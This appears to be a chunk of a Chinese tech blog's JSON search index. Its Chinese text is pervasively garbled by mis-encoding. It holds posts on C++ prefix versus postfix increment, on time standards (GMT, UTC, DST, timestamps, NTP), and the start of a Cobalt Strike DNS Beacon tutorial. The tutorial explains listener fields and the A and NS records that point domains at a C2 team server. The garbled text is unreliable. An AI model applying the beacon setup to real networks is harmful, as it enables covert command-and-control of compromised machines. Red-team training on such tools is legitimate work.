returnåŸå§‹çŠ¶æ€çš„å‰¯æœ¬çš„å€¼ï¼ˆå¦‚æœi++æ˜¯æ•´ä¸ªè¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ï¼Œå°±è¦ç”¨åˆ°åŸå§‹çš„å€¼ã€‚i++ç‹¬ç«‹æˆè¡Œçš„è¯è¡¨è¾¾å¼ç»“æœè¢«èˆå¼ƒï¼Œç”¨ä¸åˆ°ï¼‰ æ— æ³•å…ˆreturnåŸå§‹çš„å€¼ï¼Œiç„¶åå†å¢åŠ ï¼Œå› ä¸ºä¸€returnä¼ å€¼å‡ºå»ï¼Œå‡½æ•°å°±ç»“æŸäº† 12345//åç¼€ç‰ˆæœ¬int i = 5; int r = i++; //1ã€åˆ›å»ºä¸€ä¸ªä¸´æ—¶å˜é‡ä½œä¸ºiçš„å‰¯æœ¬ï¼Œå­˜ä¸€ä¸‹içš„å€¼ï¼Œæ­¤æ—¶å‰¯æœ¬çš„å€¼ä¸º5 //2ã€içš„å€¼å¢åŠ ï¼Œå˜ä¸º6 //2ã€å°†å‰¯æœ¬çš„å€¼5ï¼Œä¼ ç»™r è¿ç®—ç¬¦é‡è½½å®ç° å€Ÿç”±C++ çš„é‡è½½è¿ç®—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå·±å®ç°å‰ç¼€++ å’Œåç¼€++ æ¥æ¢ç©¶å®ƒä»¬è¿è¡Œæ•ˆç‡çš„åŒºåˆ«ã€‚ 123456789101112131415161718192021class MyClass &#123;public: int value; MyClass(int val) : value(val) &#123;&#125; // å‰ç¼€++é‡è½½ MyClass&amp; operator++() //è¿”å›ç±»å‹ä¸ºå¼•ç”¨ï¼Œå¯ä»¥åšå·¦å€¼ï¼Œæ”¯æŒé“¾å¼æ“ä½œ &#123; ++value; return *this; &#125; // åç¼€++é‡è½½ MyClass operator++(int) // (int)è¡¨ç¤ºæ˜¯åç¼€ &#123; MyClass temp = *this; ++(*this); return temp; &#125;&#125;; åç¼€++ çš„å‡½æ•°ä¸­è¦è°ƒç”¨å‰ç¼€++ ï¼Œæ‰€ä»¥++iè¦æ¯”i++æ•ˆç‡é«˜ æ‰§è¡Œæ•ˆç‡å¯¹æ¯” åæ±‡ç¼–è§’åº¦å¯¹æ¯” ç®€å•æ•°æ®ç±»å‹ å‰ç¼€++12int i = 5;int r = ++i; åç¼€++12int i = 5; int r = i++; å¯¹äºç®€å•æ•°æ®ç±»å‹ï¼Œç¼–è¯‘å™¨åšä¼˜åŒ–äº†ï¼Œæ±‡ç¼–æŒ‡ä»¤éƒ½æ˜¯5æ¡ å¤æ‚å¯¹è±¡ 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;class MyClass &#123;public: int value; MyClass(int val) : value(val) &#123;&#125; // å‰ç¼€++é‡è½½ MyClass&amp; operator++() &#123; ++value; return *this; &#125; // åç¼€++é‡è½½ MyClass operator++(int) // (int)è¡¨ç¤ºæ˜¯åç¼€ &#123; MyClass temp = *this; ++(*this); return temp; &#125;&#125;;int main() &#123; MyClass obj1(0); ++obj1; //obj1++; return 0;&#125; åç¼€++è€—æ—¶æ¥æºï¼š ä¸´æ—¶å¯¹è±¡çš„åˆ›å»ºå’Œæ‹·è´ åç¼€++çš„å‡½æ•°ä¸­è°ƒç”¨äº†å‰ç¼€++ VSä¸‹æµ‹æ‰§è¡Œè€—æ—¶ VS2019ä¸‹æµ‹i++å’Œi++æ‰§è¡Œæ•ˆç‡12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;chrono&gt;class MyClass &#123;public: int value; MyClass(int val) : value(val) &#123;&#125; // å‰ç¼€++é‡è½½ MyClass&amp; operator++() &#123; ++value; return *this; &#125; // åç¼€++é‡è½½ MyClass operator++(int) // (int)è¡¨ç¤ºæ˜¯åç¼€ &#123; MyClass temp = *this; ++(*this); return temp; &#125;&#125;;int main() &#123; MyClass obj1(0); MyClass obj2(0); // æµ‹è¯•å‰ç¼€++ auto start1 = std::chrono::high_resolution_clock::now(); for (int i = 0; i &lt; 1000000; ++i) &#123; ++obj1; &#125; auto end1 = std::chrono::high_resolution_clock::now(); std::chrono::duration&lt;double&gt; duration1 = end1 - start1; // æµ‹è¯•åç¼€++ auto start2 = std::chrono::high_resolution_clock::now(); for (int i = 0; i &lt; 1000000; ++i) &#123; obj2++; &#125; auto end2 = std::chrono::high_resolution_clock::now(); std::chrono::duration&lt;double&gt; duration2 = end2 - start2; // ä½¿ç”¨ä¸‹è¿™ä¸¤ä¸ªå˜é‡ï¼Œé˜²æ­¢ç¼–è¯‘å™¨ä¼˜åŒ–æ‰ std::cout &lt;&lt; &quot;Prefix duration: &quot; &lt;&lt; duration1.count() &lt;&lt; &quot; seconds&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Postfix duration: &quot; &lt;&lt; duration2.count() &lt;&lt; &quot; seconds&quot; &lt;&lt; std::endl; return 0;&#125; è¿è¡Œè¾“å‡º12Prefix duration: 0.0138315 secondsPostfix duration: 0.0337065 seconds å°ç»“ å¯¹äºç®€å•å¯¹è±¡ï¼ˆæ¯”å¦‚åŸºæœ¬æ•°æ®ç±»å‹ï¼Œå¦‚intç±»å‹ï¼‰ï¼Œç¼–è¯‘å™¨çš„ä¼˜åŒ–ä¼šä½¿å¾—å®ƒä»¬çš„æ•ˆç‡å‡ ä¹ç›¸åŒï¼›è€Œå¯¹äºå¤æ‚å¯¹è±¡ï¼Œåç¼€++ çš„å®ç°å†…éƒ¨è¦è°ƒç”¨å‰ç¼€++ ï¼Œå› æ­¤åç¼€++ çš„æ•ˆç‡ä¼šä½ã€‚ æœ¬æ–‡çš„ç»“è®ºåŒæ ·é€‚ç”¨äºå‰ç¼€--å’Œåç¼€-- å‚è€ƒé“¾æ¥ å…ˆåŠ ååŠ ï¼Œå­°ä¼˜å­°åŠ£ï¼Ÿ â€”â€” i å’Œ i æ¯”è¾ƒ (qq.com)","tags":["C/C++"],"categories":["ç¼–ç¨‹è¯­è¨€","C/C++"]},{"title":"GMT UTC æ—¶åŒº CST ISO å¤ä»¤æ—¶ æ—¶é—´æˆ³ NTP","path":"/posts/2ee0f961.html","content":"å­¦ä¹ æ—¶é‡åˆ°ä¸æ—¶é—´ç›¸å…³çš„è¯ã€‚æœ¬ç¯‡æ–‡ç« å°±å°†è¿™äº›è¯ä¸€å¹¶ç†æ¸…ï¼šGMTï¼ŒUTCï¼Œæ—¶åŒºï¼ŒCSTï¼ŒISOï¼Œå¤ä»¤æ—¶ï¼Œæ—¶é—´æˆ³ï¼ŒNTPã€‚ æ—¶åŒº å› ä¸ºåœ°çƒğŸŒç»•è‡ªè½¬è½´è‡ªè¥¿å‘ä¸œè½¬åŠ¨ï¼ˆå¤ªé˜³ä¸œèµ·è¥¿è½ï¼‰ï¼Œæ‰€ä»¥ä¸œæ—¶åŒºçš„äººä¼šæ¯”è¥¿æ—¶åŒºçš„äººæ—©ä¸€äº›çœ‹åˆ°å¤ªé˜³ï¼Œä»è€Œæ—¶é—´ä¸Šä¼šæ—©ä¸€ç‚¹ã€‚ ä»¥æœ¬åˆå­åˆçº¿ä¸ºä¸­å¿ƒï¼ŒæŒ‰ç…§åœ°çƒè‡ªè½¬æ–¹å‘ï¼Œæ¯éš”ç»åº¦15Â°åˆ’åˆ†ä¸€ä¸ªæ—¶åŒºï¼Œé‚£ä¹ˆå…¨çƒå…±åˆ†ä¸º24ä¸ªæ—¶åŒºï¼ˆ360Â°Ã·15Â°=24ä¸ªï¼‰ï¼šä¸œ1åŒºè‡³ä¸œ12åŒºï¼Œè¥¿1åŒºè‡³è¥¿12åŒºã€‚ä¸œ12åŒºå’Œè¥¿12åŒºè·¨åº¦éƒ½æ˜¯7.5Â°ï¼Œå…±åŒæ„æˆä¸œè¥¿12åŒºï¼Œä¹Ÿå«åŠæ—¶åŒºã€‚ ä¸­å›½çš„æ—¶åŒº ä¸­å›½ä¸œè¥¿æ¨ªè·¨5ä¸ªæ—¶åŒºã€‚ä½†å…¨å›½éƒ½ç»Ÿä¸€ä½¿ç”¨ä¸œå…«åŒºçš„åŒ—äº¬æ—¶é—´ï¼Œæ‰€ä»¥ä¼šå‡ºç°ç°åœ¨æ˜¯19ç‚¹ï¼ˆåŒ—äº¬æ—¶é—´ï¼‰ï¼Œè€Œæ–°ç–†çš„æœ‹å‹ï¼ˆä½äºä¸œ5/6åŒºå®é™…æ¯”ä¸œ8åŒºæ™š2-3ä¸ªå°æ—¶ï¼‰è¿˜å¤ªé˜³å½“ç©ºç…§çš„æƒ…å†µã€‚ ç¾å›½çš„æ—¶åŒº å…±æœ‰å››ä¸ªæ—¶åŒºï¼ŒæŒ‰ç…§å›¾ä¸­é¢œè‰²åˆ’åˆ†å¼€ï¼ˆå¹¶éä¸¥æ ¼åˆ’åˆ†ï¼Œä¸ç„¶å‡ºç°åŒä¸€å°åŒºéš”å£æ—¶é—´æ¯”ä½ æ™š1å°æ—¶å°±å°´å°¬äº†ï¼‰ï¼Œä»å³åˆ°å·¦ä¾æ¬¡ä¸ºï¼š ä¸œéƒ¨æ—¶åŒºï¼ˆETï¼‰ï¼šè¥¿5åŒºï¼Œä»£è¡¨åŸå¸‚ï¼šåç››é¡¿ç‰¹åŒºã€çº½çº¦ã€è¿ˆé˜¿å¯†ç­‰ï¼Œä¹Ÿç§°çº½çº¦æ—¶é—´ã€‚ åŒ—äº¬æ—¶é—´ = ET + 13h ä¸­éƒ¨æ—¶åŒºï¼ˆCTï¼‰ï¼šè¥¿6åŒºï¼Œä»£è¡¨åŸå¸‚ï¼šèŠåŠ å“¥ã€ä¼‘æ–¯é¡¿ç­‰ã€‚ åŒ—äº¬æ—¶é—´ = CT + 14h å±±åœ°æ—¶åŒºï¼ˆMTï¼‰ï¼šè¥¿7åŒºï¼Œä»£è¡¨åŸå¸‚ï¼šä¸¹ä½›ã€å‡¤å‡°åŸç­‰ã€‚ åŒ—äº¬æ—¶é—´ = MT + 15h å¤ªå¹³æ´‹æ—¶åŒºï¼ˆPSTï¼‰ï¼šè¥¿8åŒºï¼Œä»£è¡¨åŸå¸‚ï¼šæ´›æ‰çŸ¶ã€æ‹‰æ–¯ç»´åŠ æ–¯ã€è¥¿é›…å›¾ç­‰ã€‚ åŒ—äº¬æ—¶é—´ = PST + 16h GMT æ ¼æ—å¨æ²»ï¼ˆåˆç§°ï¼šæ ¼æ—å°¼æ²»ï¼‰æ—¶é—´ï¼Œæ˜¯æŒ‡ä½äºæœ¬åˆå­åˆçº¿ä¸Šçš„åœ°æ–¹æ—¶ï¼Œæ˜¯0æ—¶åŒºçš„åŒºæ—¶ã€‚å®ƒè§„å®šå¤ªé˜³æ¯å¤©ç»è¿‡ä½äºè‹±å›½ä¼¦æ•¦éƒŠåŒºçš„çš‡å®¶æ ¼æ—å¨æ²»å¤©æ–‡å°çš„æ—¶é—´ä¸ºä¸­åˆ12ç‚¹ã€‚ 19ä¸–çºªé‚£ä¸ªå¤§èˆªæµ·æ—¶ä»£ï¼Œè‹±å›½æ˜¯æ—¥ä¸è½å¸å›½ï¼Œæœ¬åˆå­åˆçº¿å®šåœ¨äº†è‹±å›½æ ¼æ—å°¼æ²»å¤©æ–‡å°ã€‚ çº¬åº¦ã€‚0Â°çº¬åº¦ï¼Œåˆç§°æœ¬åˆå­åˆçº¿ï¼Œç»è¿‡è‹±å›½ä¼¦æ•¦æ ¼æ—å¨æ²»å¤©æ–‡å°ã€‚ ä¸æ—¶åŒºçš„æ¢ç®— æœ¬åœ°æ—¶é—´=GMTæ—¶é—´+æ—¶åŒºå·®N ä¸œxåŒº Nä¸ºæ­£æ•° è¥¿xåŒº Nä¸ºè´Ÿæ•° ä¾‹ï¼šå‡è®¾GMTï¼ˆè‹±å›½ä¼¦æ•¦çš„æ ¼æ—å¨æ²»ï¼‰ç°åœ¨æ˜¯ä¸Šåˆ11ç‚¹ åŒ—äº¬æ—¶é—´æ˜¯ä¸œ8åŒºæ—¶é—´ï¼Œä¸0æ—¶åŒºæ ‡å‡†æ—¶é—´ç›¸å·®8å°æ—¶ã€‚é‚£ä¸­å›½åŒ—äº¬æ—¶é—´ç°åœ¨å°±æ˜¯ 11 + 8 = 19ç‚¹ï¼ˆä¸‹åˆ7ç‚¹ï¼‰ã€‚ ç¾å›½çº½çº¦ä½äºè¥¿äº”åŒºï¼Œåˆ™æ—¶åŒºå·®N=-5ã€‚é‚£ç¾å›½çº½çº¦æ—¶é—´ç°åœ¨å°±æ˜¯ 11 - 5 = 6ç‚¹ã€‚ UTC ä¸–ç•Œåè°ƒæ—¶é—´ï¼ˆCoordinated Universal Timeï¼‰ã€‚ä»¥åŸå­æ—¶ä½œä¸ºè®¡é‡å•ä½çš„æ—¶é—´ï¼Œè®¡ç®—ç»“æœæå…¶ä¸¥è°¨å’Œç²¾å¯†ã€‚å®ƒæ¯”GMTæ—¶é—´æ›´æ¥å¾—ç²¾å‡†ï¼Œè¯¯å·®å€¼å¿…é¡»ä¿æŒåœ¨0.9ç§’ä»¥å†…ï¼Œå€˜è‹¥å¤§äº0.9ç§’å°±ä¼šé€šè¿‡é—°ç§’æ¥â€œè§£å†³â€ã€‚ åŸå­æ—¶ï¼šç‰©è´¨çš„åŸå­å†…éƒ¨å‘å°„çš„ç”µç£æŒ¯è¡é¢‘ç‡ä¸ºåŸºå‡†çš„æ—¶é—´è®¡é‡ç³»ç»Ÿã€‚ç¾å›½çš„ç‰©ç†å®éªŒå¸‚åœ¨2014å¹´é€ å‡ºäº†äººç±»å†å²ä¸Šæœ€ç²¾ç¡®çš„åŸå­é’Ÿï¼Œ50äº¿å¹´è¯¯å·®1sï¼Œå¯è°“ç›¸å½“é è°±äº†ã€‚ä¸­å›½çš„é“¯åŸå­é’Ÿä¹Ÿèƒ½ç¡®ä¿2000ä¸‡å¹´è¯¯å·®ä¸è¶…è¿‡1sã€‚ ä¸åç§»é‡ æœ¬åœ°æ—¶é—´ï¼šåœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­æ‰€ä½¿ç”¨çš„æ—¶é—´æˆ‘ä»¬é€šå¸¸ç§°ä¹‹ä¸ºæœ¬åœ°æ—¶é—´ã€‚è¿™ä¸ªæ—¶é—´ç­‰äºæˆ‘ä»¬æ‰€åœ¨ï¼ˆæˆ–è€…æ‰€ä½¿ç”¨ï¼‰æ—¶åŒºå†…çš„å½“åœ°æ—¶é—´ã€‚ åœ¨ç”¨GMTæ—¶ï¼Œæœ¬åœ°æ—¶é—´é€šè¿‡GMTå’Œæ—¶åŒºçš„å…³ç³»è®¡ç®—ã€‚ è€Œä½¿ç”¨UTCæ—¶ï¼Œæœ¬åœ°æ—¶é—´é€šè¿‡UTCå’Œåç§»é‡ï¼ˆOffsetï¼‰æ¥è®¡ç®—ã€‚ è¿™ä¸ªåç§»é‡å¯è¡¨ç¤ºä¸ºï¼šUTC -æˆ–UTC +ï¼Œåé¢æ¥å°æ—¶æ•°,åˆ†é’Ÿæ•°ã€‚å¦‚ï¼š UTC +9:30è¡¨ç¤ºæ¾³å¤§åˆ©äºšä¸­å¤®æ ‡å‡†æ—¶é—´ UTC +8è¡¨ç¤ºä¸­å›½æ ‡å‡†æ—¶é—´ åç§»é‡å¸¸è§çš„è¡¨ç¤ºå½¢å¼æœ‰ï¼šÂ±[hh]:[mm]ã€Â±[hh][mm]ã€Â±[hh]è¿™ä¸‰ç§æ–¹å¼ åœ¨UTCçš„ä¸–ç•Œé‡Œå¹¶æ— æ—¶åŒºçš„æ¦‚å¿µï¼Œè€Œæ˜¯åç§»é‡ï¼ˆæ—¶é—´ç‚¹è·Ÿä¸Šåç§»é‡æ‰æ˜¯ä¸€ä¸ªæ­£è§„çš„UTCæ—¶é—´ï¼‰ï¼Œå®ƒå’Œæ—¶åŒºå¹¶æ— ç›´æ¥å…³ç³» å¯ä»¥çœ‹åˆ°åç§»é‡å¯ä»¥ç²¾ç¡®åˆ°åˆ†é’Ÿçº§åˆ«æ§åˆ¶ï¼Œéå¸¸ç²¾ç»†åŒ–ã€‚å…¨çƒåªæœ‰24ä¸ªæ—¶åŒºï¼ˆåªèƒ½ç²¾ç¡®åˆ°å°æ—¶ï¼‰ï¼Œä½†åç§»é‡æœ‰â€œæ— æ•°ä¸ªâ€ã€‚å½“ç„¶å–½ä¸ºäº†æ–¹ä¾¿æ²Ÿé€šï¼Œæ—¶é—´æ—¥æœŸè”ç›Ÿç»„ç»‡æŠŠä¸–ç•Œä¸»è¦å›½å®¶/åŸå¸‚çš„åç§»é‡æ±‡æ€»èµ·æ¥ä¸”éƒ½ç»™å–äº†ä¸ªTime zone nameåç§°ç”¨äºæ²Ÿé€šï¼Œå…±å¥½å‡ ç™¾ä¸ªï¼Œéƒ¨åˆ†æˆªå›¾å¦‚ä¸‹ï¼š https://www.timeanddate.com/time/zones/ GMTä¸UTCçš„è”ç³» æ—§æ ‡å‡†å’Œæ–°æ ‡å‡† GMTæ›¾è¢«ç”¨ä½œå›½é™…æ ‡å‡†æ—¶é—´ï¼Œç°åœ¨UTCå–ä»£äº†GMTæˆä¸ºæ–°çš„ä¸–ç•Œæ—¶é—´æ ‡å‡†ã€‚ GMTæ˜¯æ ¹æ®åœ°çƒçš„è‡ªè½¬å’Œå…¬è½¬æ¥è®¡ç®—æ—¶é—´çš„ï¼Œè‡ªè½¬ä¸€åœˆæ˜¯ä¸€å¤©ï¼Œå…¬è½¬ä¸€åœˆæ˜¯ä¸€å¹´ã€‚ä½†æ˜¯å‘¢ï¼Œåœ°çƒå…¬è½¬çš„è½¨é“æ˜¯æ¤­åœ†å½¢çš„ï¼Œè€Œä¸”åæ¥äººä»¬å‘ç°åœ°çƒè‡ªè½¬æ—¶é—´ä¹Ÿä¸æ˜¯æ’å®šçš„ã€‚è¿™æ ·ä¼šé€ æˆä¸€å¤©æ—¶é—´é•¿ä¸€å¤©æ—¶é—´çŸ­çš„æƒ…å†µã€‚ UTCä»¥åŸå­é’Ÿæ‰€å®šä¹‰çš„ç§’é•¿ä¸ºåŸºç¡€ï¼ŒUTCæ—¶é—´è®¤ä¸ºä¸€ä¸ªå¤ªé˜³æ—¥ï¼ˆä¸€å¤©ï¼‰æ€»æ˜¯æ’å®šçš„86400ç§’ï¼ˆ24å°æ—¶ï¼‰ã€‚ å…¶ä»–æ–¹é¢ UTCæ˜¯æ ‡å‡†æ—¶é—´å‚ç…§ï¼ŒåƒGMTï¼ˆæ ¼æ—å¨æ²»æ—¶é—´ï¼‰ã€ETï¼ˆç¾å›½ä¸œéƒ¨æ—¶é—´ï¼‰ã€PSTï¼ˆå¤ªå¹³æ´‹æ—¶é—´ï¼‰ã€CSTï¼ˆåŒ—äº¬æ—¶é—´ï¼‰ç­‰ç­‰éƒ½æ˜¯å…·ä½“çš„æ—¶åŒºæ—¶é—´ã€‚ GMTèƒ½å’ŒUTCç›´æ¥è½¬æ¢ï¼Œä»…ä»…æ˜¯å› ä¸ºç¢°å·§GMTæ˜¯0æ—¶åŒºæ—¶é—´ï¼Œæ•°å€¼ä¸Šåˆšå¥½å’ŒUTCæ˜¯ç›¸ç­‰çš„ï¼ˆä¸éœ€è¦ç²¾ç¡®åˆ°ç§’çš„æƒ…å†µä¸‹ï¼ŒäºŒè€…å¯ä»¥è§†ä¸ºç›¸ç­‰ï¼‰ï¼Œçœ‹èµ·æ¥ä¸€æ ·ï¼Œä½†æ˜¯æ¦‚å¿µå«ä¹‰ä¸Šè¯·åŠ¡å¿…åŒºåˆ†å¼€ã€‚å¦‚æœéœ€è¦ç²¾ç¡®åˆ°ç§’çº§ç”šè‡³ä»¥ä¸‹å•ä½éœ€è¦ä½¿ç”¨ UTC å…¶ä»–æ¦‚å¿µ CST æ ¹æ®ä¸Šä¸‹æ–‡è¯­å¢ƒæ¨æ–­ï¼š CST (China Standard Time) ï¼šä¸­å›½æ ‡å‡†æ—¶é—´ UTC+8:00 Central Standard Time (USA) UTC-6:00 Central Standard Time (Australia) UTC+9:30 Cuba Standard Time UTC-4:00 ISO ä¸€ä¸ªæŒ‡å®šå’Œå‘å¸ƒå›½é™…æ ‡å‡†çš„ç»„ç»‡ã€‚ISOå‘å¸ƒäº†ä¸æ—¶é—´ç›¸å…³çš„æ ‡å‡†ï¼Œä¾‹å¦‚ISO 8601ï¼Œä¸€ç§æ˜ç¡®çš„ã€å›½é™…ä¸Šéƒ½èƒ½ç†è§£çš„æ—¥å†å’Œæ—¶é’Ÿæ ¼å¼YYYY-MM-DDã€‚åœ¨æ—¶é—´æ—¥æœŸçš„æœ‰å…³æ–‡ç« ä¸­å‡ºç°çš„ISOå…¶å®æ˜¯ISO 8601æ ‡å‡†çš„ç®€å†™ã€‚ å¤ä»¤æ—¶ DSTï¼ˆDaylight Saving Timeï¼‰ï¼Œå¤ä»¤æ—¶åˆç§°å¤å­£æ—¶é—´ï¼ˆæ²¡æœ‰å†¬ä»¤æ—¶ï¼‰ã€‚è¿™æ˜¯åœ°æ–¹æ”¿åºœä¸ºäº†é¼“åŠ±äººä»¬æ—©ç¡æ—©èµ·ï¼Œä¸è¦æµªè´¹ç”µï¼Œå°½é‡å¤šç”¨è‡ªç„¶èµ„æºï¼ˆå› ä¸ºå¤å¤©æ—¥ç…§æ—¶é—´é•¿ï¼‰è€Œäººä¸ºè§„å®šåœ°æ–¹æ—¶é—´çš„ä¸€ç§åˆ¶åº¦ã€‚ æ¯å¹´çš„å¤ä»¤æ—¶æ—¶é—´æ®µè¿˜ä¸ä¸€æ ·ï¼ˆä¸€èˆ¬åœ¨3æœˆçš„ç¬¬2ä¸ªå‘¨æ—¥å¼€å§‹ï¼‰ï¼Œæ¯”å¦‚ç¾å›½2020å¹´å¤ä»¤æ—¶æ—¶é—´æ˜¯ï¼š2020å¹´3æœˆ8æ—¥ - 2020å¹´11æœˆ1æ—¥ã€‚å…·ä½“åšæ³•æ˜¯ï¼šåœ¨3.8å·è¿™å¤©å°†æ—¶é’Ÿå¾€å‰æ‹¨1ä¸ªå°æ—¶ï¼Œ11.1å·è¿™å¤©è¿˜åŸå›æ¥ã€‚ æ—¶é—´æˆ³ å®šä¹‰ä¸€ä¸ªæ—¶é—´åŸç‚¹ã€‚ä»æ ¼æ—å¨æ²»æ—¶é—´(GMT)1970å¹´1æœˆ1æ—¥çš„åˆå¤œ0ç‚¹0åˆ†0ç§’å¼€å§‹è¿‡å»çš„æ€»ç§’æ•°/æ¯«ç§’æ•°ã€‚è¿™ä¸ªæ€»ç§’æ•°/æ¯«ç§’æ•°å…¨ä¸–ç•Œéƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ—¶é—´æˆ³å’Œæ—¶åŒºæ— å…³ã€‚ æ—¶é—´æˆ³ä¸€èˆ¬æŒ‡UNIXæ—¶é—´ï¼Œæˆ–ç±»UNIXç³»ç»Ÿï¼ˆæ¯”å¦‚Linuxã€MacOSç­‰ï¼‰ä½¿ç”¨çš„æ—¶é—´è¡¨ç¤ºæ–¹å¼ã€‚å®šä¹‰ä¸ºï¼šä»UTCæ—¶é—´çš„1970-1-1 0:0:0èµ·åˆ°ç°åœ¨çš„æ€»ç§’æ•°ï¼ˆç§’æ˜¯æ¯«ç§’ã€å¾®å¦™ã€çº³ç§’çš„æ€»ç§°ï¼‰ã€‚ é—®é¢˜ï¼šç”±äºé—°ç§’çš„å­˜åœ¨ï¼Œé‚£ä¹ˆå½“é—°ç§’å‘ç”Ÿæ—¶ï¼Œå°±ææœ‰å¯èƒ½å‡ºç°åŒä¸€ä¸ªæ—¶é—´æˆ³è¡¨ç¤ºä¸¤ä¸ªæ—¶åˆ»çš„æƒ…å†µï¼ˆç±»ä¼¼æ—¶é’Ÿå›æ‹¨ï¼‰ï¼Œè€Œä¸”é—°ç§’è¿˜æ²¡è§„å¾‹æ‰€ä»¥æ— æ³•ç¨‹åºå¼çš„é¿å…ï¼Œæ€ä¹ˆåŠï¼Ÿè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä¸€ç§ä¸“é—¨çš„å¯¹æ—¶åè®®æ¥ä¿è¯äº†ï¼Œå®ƒå°±æ˜¯ï¼šç½‘ç»œæ—¶é—´åè®®ã€‚ ç½‘ç»œæ—¶é—´åè®® NTPï¼ˆNetwork Time Protocolï¼‰æ˜¯ç”¨æ¥ä½¿è®¡ç®—æœºæ—¶é—´åŒæ­¥åŒ–çš„ä¸€ç§åè®®ï¼Œå®ƒå¯ä»¥ä½¿è®¡ç®—æœºå¯¹å…¶æœåŠ¡å™¨æˆ–æ—¶é’Ÿæºï¼ˆå¦‚çŸ³è‹±é’Ÿï¼ŒGPSç­‰ç­‰)åšåŒæ­¥åŒ–ï¼Œå®ƒå¯ä»¥æä¾›é«˜ç²¾å‡†åº¦çš„æ—¶é—´æ ¡æ­£ï¼ˆLANä¸Šä¸æ ‡å‡†é—´å·®å°äº1æ¯«ç§’ï¼ŒWANä¸Šå‡ åæ¯«ç§’ï¼‰ï¼Œä¸”å¯ä»‹ç”±åŠ å¯†ç¡®è®¤çš„æ–¹å¼æ¥é˜²æ­¢æ¶æ¯’çš„åè®®æ”»å‡»ã€‚ NTPçš„ç›®çš„æ˜¯åœ¨æ— åºçš„Internetç¯å¢ƒä¸­æä¾›ç²¾ç¡®å’Œå¥å£®çš„æ—¶é—´æœåŠ¡ï¼Œå„å¤§æ“ä½œç³»ç»Ÿï¼ˆwindows/Linuxï¼‰å¯¹NTPéƒ½æœ‰å®ç°ã€‚ å‚è€ƒé“¾æ¥ GMT UTC CST ISO å¤ä»¤æ—¶ æ—¶é—´æˆ³ï¼Œéƒ½æ˜¯äº›ä»€ä¹ˆé¬¼ï¼Ÿ","tags":["GMT","UTC","æ—¶åŒº","ISO","å¤ä»¤æ—¶","æ—¶é—´æˆ³","NTP"],"categories":["è®¡ç®—æœºçŸ¥è¯†","å¸¸è¯†"]},{"title":"Cobalt Strike-DNS Beaconä½¿ç”¨è§£è¯»","path":"/posts/1288e771.html","content":"The DNS Beacon is a favorite Cobalt Strike feature. This payload uses DNS requests to beacon back to you. These DNS requests are lookups against domains that your Cobalt Strike team server is authoritative for. The DNS response tells Beacon to go to sleep or to connect to you to download tasks. The DNS response will also tell the Beacon how to download tasks from your team server. æ¥çœ‹çœ‹æ–‡æ¡£ä¸­å†™çš„å¦‚ä½•åˆ›å»ºDNS beaconçš„ç›‘å¬å™¨ã€‚ To create a DNS Beacon listener,select Cobalt Strike -&gt; Listeners on the main menu and press the Add button at the bottom of the Listeners tab display.Select Beacon DNS as the Payload type. Parameters DNS Hosts - Press [+] to add one or more domains to beacon to. Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team serverâ€™s A record. DNS Host (Stager) - This configures the DNS Beaconâ€™s TXT record stager. This stager is only used with Cobalt Strike features that require an explicit stager. Your Cobalt Strike team server system must be authoritative for this domain as well. DNS Hostså­—æ®µå¡«å…¥ä¸€ä¸ªæˆ–å¤šä¸ªåŸŸåã€‚ è¿™äº›åŸŸåéƒ½æ˜¯NSè®°å½•ï¼Œå‡æŒ‡å‘teamserverï¼ˆå‡è®¾è®°ä¸ºteamserverAï¼‰ä½œä¸ºæƒå¨æœåŠ¡å™¨ã€‚ DNS Host(Stager)å­—æ®µå¡«å…¥ä¸€ä¸ªåŸŸåã€‚ å½“ç”Ÿæˆçš„è¢«æ§ç«¯ç¨‹åºæ˜¯Stageræ—¶ä¼šç”¨åˆ°è¿™ä¸ªåŸŸåï¼ŒStagerè¿è¡Œåé€šè¿‡è®¿é—®è¿™ä¸ªåŸŸåæ¥ä¸‹è½½stage è¿™ä¸ªåŸŸåä¹Ÿæ˜¯NSè®°å½•ï¼ŒæŒ‡å‘teamserverä½œä¸ºæƒå¨æœåŠ¡å™¨ã€‚ è¿™ä¸ªteamserverå¯ä»¥æ˜¯teamserverAï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„teamserverï¼Œæ¯”å¦‚teamserverBã€‚ è¿™ä¸ªåŸŸåå¯ä»¥æ˜¯DNS Hostsé‡Œå¡«çš„å…¶ä¸­æŸä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥å¡«å’ŒDNS Hostsä¸åŒçš„åŸŸåã€‚ ä¼°è®¡çœ‹åˆ°è¿™è¿˜æ˜¯è¿·ç³Šï¼Ÿä¸‹é¢ï¼Œæˆ‘ä»¬åšå®éªŒï¼Œè¾¹åšå®éªŒè¾¹è®²è§£ã€‚ å®éªŒ åˆ›å»ºAè®°å½•å’ŒNSè®°å½• vps+åŸŸåæ–¹æ¡ˆ æŒ‰å®æˆ˜ç¯å¢ƒæ¥è®²çš„è¯ï¼Œéœ€è¦è´­ä¹°vpsï¼Œå› ä¸ºè¦æœ‰å…¬ç½‘ipï¼Œè®©é¶æœºè®¿é—®åˆ°ä½ çš„æ”»å‡»æœºã€‚éœ€è¦è´­ä¹°åŸŸåï¼Œå¯¹è¯¥åŸŸåä¸Šé…ç½®Aè®°å½•å’ŒNSè®°å½•ã€‚æ¯”å¦‚ï¼Œ è¦è´­ä¹°èƒ½é…ç½®NSè®°å½•çš„åŸŸå ä¸€æ¡Aè®°å½•æŒ‡å‘CSçš„IPåœ°å€ï¼Œvpn.test.site =&gt; CSçš„IPåœ°å€ å‡ æ¡NSè®°å½•æŒ‡å‘åˆšåˆšAè®°å½•å¯¹åº”çš„åŸŸåï¼ˆä¹Ÿå¯ä»¥åªå†™ä¸€æ¡ï¼‰ ns1.test.site =&gt; vpn.test.site ns2.test.site =&gt; vpn.test.site ns3.test.site =&gt; vpn.test.site æˆ–å°±åªæœ‰ä¸€æ¡ 